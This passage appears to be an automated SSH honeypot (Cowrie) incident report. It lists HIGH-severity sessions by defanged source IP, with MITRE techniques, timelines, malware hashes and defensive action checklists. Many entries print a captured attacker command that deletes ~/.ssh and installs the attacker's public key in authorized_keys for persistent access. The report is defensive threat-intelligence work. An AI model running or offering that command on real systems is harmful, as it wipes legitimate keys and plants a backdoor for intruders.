| `2026-04-11 05:54:34` | `cowrie.command.failed` |
| `2026-04-11 05:54:35` | `cowrie.log.closed` |
| `2026-04-11 05:54:35` | `cowrie.session.params` |
| `2026-04-11 05:54:35` | `cowrie.command.input` |
| `2026-04-11 05:54:35` | `cowrie.session.file_download` |
| `2026-04-11 05:54:35` | `cowrie.log.closed` |
| `2026-04-11 05:54:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.185[.]71` to AbuseIPDB if not already reported
- [ ] Block `43.165.185[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fa7d3683899

| Field | Detail |
|---|---|
| **Source IP** | `43.165.185[.]71` |
| **First Seen** | 2026-04-11 05:54 |
| **Last Seen** | 2026-04-11 05:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 05:54:37` | `cowrie.session.connect` |
| `2026-04-11 05:54:37` | `cowrie.client.version` |
| `2026-04-11 05:54:37` | `cowrie.client.kex` |
| `2026-04-11 05:54:38` | `cowrie.login.success` |
| `2026-04-11 05:54:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.185[.]71` to AbuseIPDB if not already reported
- [ ] Block `43.165.185[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea314437f1a8

| Field | Detail |
|---|---|
| **Source IP** | `186.38.26[.]5` |
| **First Seen** | 2026-04-11 05:54 |
| **Last Seen** | 2026-04-11 05:55 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 05:54:50` | `cowrie.session.connect` |
| `2026-04-11 05:54:50` | `cowrie.client.version` |
| `2026-04-11 05:54:50` | `cowrie.client.kex` |
| `2026-04-11 05:54:52` | `cowrie.login.success` |
| `2026-04-11 05:54:53` | `cowrie.session.params` |
| `2026-04-11 05:54:53` | `cowrie.command.input` |
| `2026-04-11 05:54:53` | `cowrie.command.failed` |
| `2026-04-11 05:54:53` | `cowrie.log.closed` |
| `2026-04-11 05:54:54` | `cowrie.session.params` |
| `2026-04-11 05:54:54` | `cowrie.command.input` |
| `2026-04-11 05:54:54` | `cowrie.session.file_download` |
| `2026-04-11 05:54:54` | `cowrie.log.closed` |
| `2026-04-11 05:55:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.38.26[.]5` to AbuseIPDB if not already reported
- [ ] Block `186.38.26[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53c81efc8ec3

| Field | Detail |
|---|---|
| **Source IP** | `203.90.110[.]186` |
| **First Seen** | 2026-04-11 05:54 |
| **Last Seen** | 2026-04-11 05:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 05:54:52` | `cowrie.session.connect` |
| `2026-04-11 05:54:52` | `cowrie.client.version` |
| `2026-04-11 05:54:52` | `cowrie.client.kex` |
| `2026-04-11 05:54:52` | `cowrie.login.success` |
| `2026-04-11 05:54:53` | `cowrie.session.params` |
| `2026-04-11 05:54:53` | `cowrie.command.input` |
| `2026-04-11 05:54:53` | `cowrie.command.failed` |
| `2026-04-11 05:54:53` | `cowrie.log.closed` |
| `2026-04-11 05:54:53` | `cowrie.session.params` |
| `2026-04-11 05:54:53` | `cowrie.command.input` |
| `2026-04-11 05:54:53` | `cowrie.session.file_download` |
| `2026-04-11 05:54:53` | `cowrie.log.closed` |
| `2026-04-11 05:54:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.90.110[.]186` to AbuseIPDB if not already reported
- [ ] Block `203.90.110[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fab078212f43

| Field | Detail |
|---|---|
| **Source IP** | `203.90.110[.]186` |
| **First Seen** | 2026-04-11 05:54 |
| **Last Seen** | 2026-04-11 05:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 05:54:54` | `cowrie.session.connect` |
| `2026-04-11 05:54:54` | `cowrie.client.version` |
| `2026-04-11 05:54:54` | `cowrie.client.kex` |
| `2026-04-11 05:54:54` | `cowrie.login.success` |
| `2026-04-11 05:54:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.90.110[.]186` to AbuseIPDB if not already reported
- [ ] Block `203.90.110[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4ba2e9ed5fb

| Field | Detail |
|---|---|
| **Source IP** | `186.38.26[.]5` |
| **First Seen** | 2026-04-11 05:54 |
| **Last Seen** | 2026-04-11 05:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 05:54:58` | `cowrie.session.connect` |
| `2026-04-11 05:54:58` | `cowrie.client.version` |
| `2026-04-11 05:54:59` | `cowrie.client.kex` |
| `2026-04-11 05:55:00` | `cowrie.login.success` |
| `2026-04-11 05:55:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.38.26[.]5` to AbuseIPDB if not already reported
- [ ] Block `186.38.26[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d9aed0552cb

| Field | Detail |
|---|---|
| **Source IP** | `201.49.108[.]245` |
| **First Seen** | 2026-04-11 05:55 |
| **Last Seen** | 2026-04-11 05:55 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 05:55:21` | `cowrie.session.connect` |
| `2026-04-11 05:55:21` | `cowrie.client.version` |
| `2026-04-11 05:55:21` | `cowrie.client.kex` |
| `2026-04-11 05:55:23` | `cowrie.login.success` |
| `2026-04-11 05:55:24` | `cowrie.session.params` |
| `2026-04-11 05:55:24` | `cowrie.command.input` |
| `2026-04-11 05:55:24` | `cowrie.command.failed` |
| `2026-04-11 05:55:24` | `cowrie.log.closed` |
| `2026-04-11 05:55:25` | `cowrie.session.params` |
| `2026-04-11 05:55:25` | `cowrie.command.input` |
| `2026-04-11 05:55:25` | `cowrie.session.file_download` |
| `2026-04-11 05:55:25` | `cowrie.log.closed` |
| `2026-04-11 05:55:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.49.108[.]245` to AbuseIPDB if not already reported
- [ ] Block `201.49.108[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cb1d4fd5175

| Field | Detail |
|---|---|
| **Source IP** | `201.49.108[.]245` |
| **First Seen** | 2026-04-11 05:55 |
| **Last Seen** | 2026-04-11 05:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 05:55:29` | `cowrie.session.connect` |
| `2026-04-11 05:55:29` | `cowrie.client.version` |
| `2026-04-11 05:55:29` | `cowrie.client.kex` |
| `2026-04-11 05:55:31` | `cowrie.login.success` |
| `2026-04-11 05:55:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.49.108[.]245` to AbuseIPDB if not already reported
- [ ] Block `201.49.108[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69af4eafdd16

| Field | Detail |
|---|---|
| **Source IP** | `203.90.110[.]186` |
| **First Seen** | 2026-04-11 05:57 |
| **Last Seen** | 2026-04-11 05:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 05:57:00` | `cowrie.session.connect` |
| `2026-04-11 05:57:00` | `cowrie.client.version` |
| `2026-04-11 05:57:00` | `cowrie.client.kex` |
| `2026-04-11 05:57:00` | `cowrie.login.success` |
| `2026-04-11 05:57:00` | `cowrie.session.params` |
| `2026-04-11 05:57:00` | `cowrie.command.input` |
| `2026-04-11 05:57:00` | `cowrie.command.failed` |
| `2026-04-11 05:57:00` | `cowrie.log.closed` |
| `2026-04-11 05:57:00` | `cowrie.session.params` |
| `2026-04-11 05:57:00` | `cowrie.command.input` |
| `2026-04-11 05:57:00` | `cowrie.session.file_download` |
| `2026-04-11 05:57:00` | `cowrie.log.closed` |
| `2026-04-11 05:57:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.90.110[.]186` to AbuseIPDB if not already reported
- [ ] Block `203.90.110[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e4580ab40f5

| Field | Detail |
|---|---|
| **Source IP** | `203.90.110[.]186` |
| **First Seen** | 2026-04-11 05:57 |
| **Last Seen** | 2026-04-11 05:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 05:57:02` | `cowrie.session.connect` |
| `2026-04-11 05:57:02` | `cowrie.client.version` |
| `2026-04-11 05:57:02` | `cowrie.client.kex` |
| `2026-04-11 05:57:02` | `cowrie.login.success` |
| `2026-04-11 05:57:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.90.110[.]186` to AbuseIPDB if not already reported
- [ ] Block `203.90.110[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd8ca730d951

| Field | Detail |
|---|---|
| **Source IP** | `201.49.108[.]245` |
| **First Seen** | 2026-04-11 05:57 |
| **Last Seen** | 2026-04-11 05:57 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 05:57:12` | `cowrie.session.connect` |
| `2026-04-11 05:57:12` | `cowrie.client.version` |
| `2026-04-11 05:57:13` | `cowrie.client.kex` |
| `2026-04-11 05:57:14` | `cowrie.login.success` |
| `2026-04-11 05:57:15` | `cowrie.session.params` |
| `2026-04-11 05:57:15` | `cowrie.command.input` |
| `2026-04-11 05:57:15` | `cowrie.command.failed` |
| `2026-04-11 05:57:15` | `cowrie.log.closed` |
| `2026-04-11 05:57:16` | `cowrie.session.params` |
| `2026-04-11 05:57:16` | `cowrie.command.input` |
| `2026-04-11 05:57:16` | `cowrie.session.file_download` |
| `2026-04-11 05:57:16` | `cowrie.log.closed` |
| `2026-04-11 05:57:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.49.108[.]245` to AbuseIPDB if not already reported
- [ ] Block `201.49.108[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8315732545e

| Field | Detail |
|---|---|
| **Source IP** | `201.49.108[.]245` |
| **First Seen** | 2026-04-11 05:57 |
| **Last Seen** | 2026-04-11 05:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 05:57:20` | `cowrie.session.connect` |
| `2026-04-11 05:57:20` | `cowrie.client.version` |
| `2026-04-11 05:57:20` | `cowrie.client.kex` |
| `2026-04-11 05:57:22` | `cowrie.login.success` |
| `2026-04-11 05:57:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.49.108[.]245` to AbuseIPDB if not already reported
- [ ] Block `201.49.108[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-880b1d722339

| Field | Detail |
|---|---|
| **Source IP** | `186.38.26[.]5` |
| **First Seen** | 2026-04-11 05:58 |
| **Last Seen** | 2026-04-11 05:58 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 05:58:38` | `cowrie.session.connect` |
| `2026-04-11 05:58:38` | `cowrie.client.version` |
| `2026-04-11 05:58:38` | `cowrie.client.kex` |
| `2026-04-11 05:58:40` | `cowrie.login.success` |
| `2026-04-11 05:58:41` | `cowrie.session.params` |
| `2026-04-11 05:58:41` | `cowrie.command.input` |
| `2026-04-11 05:58:41` | `cowrie.command.failed` |
| `2026-04-11 05:58:41` | `cowrie.log.closed` |
| `2026-04-11 05:58:42` | `cowrie.session.params` |
| `2026-04-11 05:58:42` | `cowrie.command.input` |
| `2026-04-11 05:58:42` | `cowrie.session.file_download` |
| `2026-04-11 05:58:42` | `cowrie.log.closed` |
| `2026-04-11 05:58:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.38.26[.]5` to AbuseIPDB if not already reported
- [ ] Block `186.38.26[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c413cba2083

| Field | Detail |
|---|---|
| **Source IP** | `186.38.26[.]5` |
| **First Seen** | 2026-04-11 05:58 |
| **Last Seen** | 2026-04-11 05:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 05:58:46` | `cowrie.session.connect` |
| `2026-04-11 05:58:46` | `cowrie.client.version` |
| `2026-04-11 05:58:46` | `cowrie.client.kex` |
| `2026-04-11 05:58:48` | `cowrie.login.success` |
| `2026-04-11 05:58:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.38.26[.]5` to AbuseIPDB if not already reported
- [ ] Block `186.38.26[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a0aee241731

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-11 06:01 |
| **Last Seen** | 2026-04-11 06:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:01:47` | `cowrie.session.connect` |
| `2026-04-11 06:01:47` | `cowrie.client.version` |
| `2026-04-11 06:01:47` | `cowrie.client.kex` |
| `2026-04-11 06:01:48` | `cowrie.login.success` |
| `2026-04-11 06:01:48` | `cowrie.session.params` |
| `2026-04-11 06:01:48` | `cowrie.command.input` |
| `2026-04-11 06:01:48` | `cowrie.command.failed` |
| `2026-04-11 06:01:48` | `cowrie.log.closed` |
| `2026-04-11 06:01:48` | `cowrie.session.params` |
| `2026-04-11 06:01:48` | `cowrie.command.input` |
| `2026-04-11 06:01:49` | `cowrie.session.file_download` |
| `2026-04-11 06:01:49` | `cowrie.log.closed` |
| `2026-04-11 06:01:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46a727a4d14e

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-11 06:01 |
| **Last Seen** | 2026-04-11 06:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:01:51` | `cowrie.session.connect` |
| `2026-04-11 06:01:51` | `cowrie.client.version` |
| `2026-04-11 06:01:51` | `cowrie.client.kex` |
| `2026-04-11 06:01:51` | `cowrie.login.success` |
| `2026-04-11 06:01:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f64b70e1a269

| Field | Detail |
|---|---|
| **Source IP** | `186.38.26[.]5` |
| **First Seen** | 2026-04-11 06:02 |
| **Last Seen** | 2026-04-11 06:02 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:02:36` | `cowrie.session.connect` |
| `2026-04-11 06:02:36` | `cowrie.client.version` |
| `2026-04-11 06:02:37` | `cowrie.client.kex` |
| `2026-04-11 06:02:38` | `cowrie.login.success` |
| `2026-04-11 06:02:39` | `cowrie.session.params` |
| `2026-04-11 06:02:39` | `cowrie.command.input` |
| `2026-04-11 06:02:39` | `cowrie.command.failed` |
| `2026-04-11 06:02:39` | `cowrie.log.closed` |
| `2026-04-11 06:02:40` | `cowrie.session.params` |
| `2026-04-11 06:02:40` | `cowrie.command.input` |
| `2026-04-11 06:02:41` | `cowrie.session.file_download` |
| `2026-04-11 06:02:41` | `cowrie.log.closed` |
| `2026-04-11 06:02:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.38.26[.]5` to AbuseIPDB if not already reported
- [ ] Block `186.38.26[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d3f873b79c4

| Field | Detail |
|---|---|
| **Source IP** | `186.38.26[.]5` |
| **First Seen** | 2026-04-11 06:02 |
| **Last Seen** | 2026-04-11 06:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 06:02:45` | `cowrie.session.connect` |
| `2026-04-11 06:02:45` | `cowrie.client.version` |
| `2026-04-11 06:02:45` | `cowrie.client.kex` |
| `2026-04-11 06:02:47` | `cowrie.login.success` |
| `2026-04-11 06:02:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.38.26[.]5` to AbuseIPDB if not already reported
- [ ] Block `186.38.26[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16a60644f3b1

